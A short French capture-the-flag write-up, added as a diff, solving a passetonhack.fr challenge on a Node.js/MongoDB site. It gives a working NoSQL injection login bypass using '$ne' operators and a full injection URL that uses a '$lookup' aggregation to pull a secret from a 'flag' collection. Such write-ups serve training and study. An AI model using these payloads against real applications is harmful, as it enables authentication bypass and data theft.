@@ -1,0 +1,9 @@
+On sait que c'est sous nodejs et mangodb --> Nosql injection
+
+On bypass le portail en fabriquant une requete -->
+username[$ne]=blabla&password[$ne]=blablapass
+
+Ensuite on accède au site et on constate que le paramètre id est injectable nosql, on fabrique l'url
+https://www.passetonhack.fr/d35efdc849090bf09ebf77e0a9959add/car?id=57318"%7D%7D,%7B"$lookup":%7B"from":"flag","as":"flag","pipeline":[{"$match":{}}]}},{"$project":{"_id":0,"carId":"$id","flagId":{"$arrayElemAt":["$flag.secret",0]}}},{"$addFields":{"ok":"
+
+Et voila
